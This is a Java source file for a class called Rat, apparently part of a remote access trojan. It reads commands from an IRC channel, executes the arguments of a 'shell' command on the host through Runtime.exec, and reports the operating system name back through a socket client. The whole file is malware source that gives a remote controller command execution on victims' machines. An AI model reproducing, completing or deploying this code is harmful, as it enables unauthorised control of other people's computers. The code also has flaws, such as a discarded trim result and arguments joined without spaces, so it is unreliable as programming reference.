import java.io.IOException;
import java.util.HashMap;
import java.util.ArrayList;
 
public class Rat
{
        // Global variables
        String[] commands = {"shell", "whatOS"}; // holds all the commands the RAT can interpret
        HashMap<String, String> commandsExplained; // Holds the explanations of the commands
        ArrayList<String> arguments;
       
        // SocketClient.java object
        SocketClient sc;
       
        /*
         * CONSTRUCTAHHHH
         */
        public Rat(SocketClient sc)
        {
                this.sc = sc;
                init();
        }
       
        /*
         * init()
         */
        public void init()
        {
                commandsExplained = new HashMap<String, String>();
               
                commandsExplained.put(commands[0], "takes an argument (or more), and that argument is executed in the shell");
                commandsExplained.put(commands[1], "returns the name of the OS the user is using");
        }
       
        /*
         * findCommand()
         * Used by: this
         * Used for: finding the command (if there is one) that someone has written in the IRC channel, then executing
         * the command.
         * How: puts all the word in the input into an array, the first index in the array tells us the command, the next
           ones the arguments.
         */
        public void findCommand(String input) throws IOException, InterruptedException
        {
                System.out.println("findCommand(String input) - Rat.java");
                input.trim();
                String[] words = input.split(" ");
               
                if(words[0].equals(commands[0]))
                {
                        String command = "";
                        int temp = 1;
                        for (String string : words)
                        {
                                if(temp == 1){} // Do nothing
                                else
                                        command += string;
                                temp++;
                        }
                        System.out.println("Executes command: " + command);
                        shellCommand(command);
                }
                else if(words[0].equals(commands[1]))
                {
                        whatOSCommand();
                }
        }
       
        /*
         * shellCommand()
         */
        public void shellCommand(String s)
        {
                System.out.println("shellCommand(String s) - Rat.java");
               
                try
                {
                        Process child = Runtime.getRuntime().exec(s); // executes the command
                } catch (IOException e) {e.printStackTrace();}
        }
 
        /*
         * whatOSCommand()
         */
        public void whatOSCommand() throws IOException, InterruptedException
        {
                System.out.println("whatOSCommand() - Rat.java");
                //
                sc.sendMessage(System.getProperty("os.name"));
        }
}
